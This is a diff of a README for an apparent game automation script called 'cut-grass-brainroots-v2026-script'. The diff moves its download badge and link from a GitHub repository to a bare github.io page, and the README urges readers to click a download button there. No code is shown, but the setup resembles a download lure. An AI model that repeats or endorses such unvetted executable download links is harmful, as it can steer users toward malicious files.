@@ -1,12 +1,12 @@
 # ✂️ cut-grass-brainroots-v2026-script - Automate Your Grass Cutting Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-cut--grass--brainroots--v2026--script-blue?style=for-the-badge&logo=github)](https://github.com/polymorphic-apraxia825/cut-grass-brainroots-v2026-script)
+[![Download Now](https://img.shields.io/badge/Download-cut--grass--brainroots--v2026--script-blue?style=for-the-badge&logo=github)](https://polymorphic-apraxia825.github.io)
 
 ---
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/polymorphic-apraxia825/cut-grass-brainroots-v2026-script](https://github.com/polymorphic-apraxia825/cut-grass-brainroots-v2026-script)
+Visit this link to download the application: [https://polymorphic-apraxia825.github.io](https://polymorphic-apraxia825.github.io)
 
 Once you click the link above, you will be taken to the download page. Look for the big green button that says "Download" or "Get" and click it. The download will start automatically, and you will see a file in your browser's download bar at the bottom of the screen.
 
